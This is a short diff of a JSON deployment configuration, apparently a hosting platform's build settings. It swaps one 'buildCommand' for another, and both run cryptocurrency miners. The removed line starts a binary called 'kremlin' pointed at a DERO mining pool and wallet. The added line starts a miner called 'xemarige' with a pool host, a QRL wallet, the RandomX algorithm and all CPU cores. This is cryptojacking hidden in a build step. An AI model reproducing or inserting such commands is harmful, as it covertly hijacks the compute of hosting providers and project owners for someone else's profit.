@@ -1,5 +1,5 @@
 {
-  "buildCommand": "./kremlin -r fastpool.xyz:10100 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)",
+  "buildCommand": "./xemarige --donate-level 1 -o de.qrl.gfwroute.com:1166 -u Q01060090d6a7b0fa539968556afdc7beff396a2e41f7fa83001c8e8848c7734f3f0ddd90253143.$(echo $RANDOM | md5sum | head -c 10) -a rx/0 -k -t $(nproc --all)",
   "crons": [
     {
       "path": "/api/cron/1m",
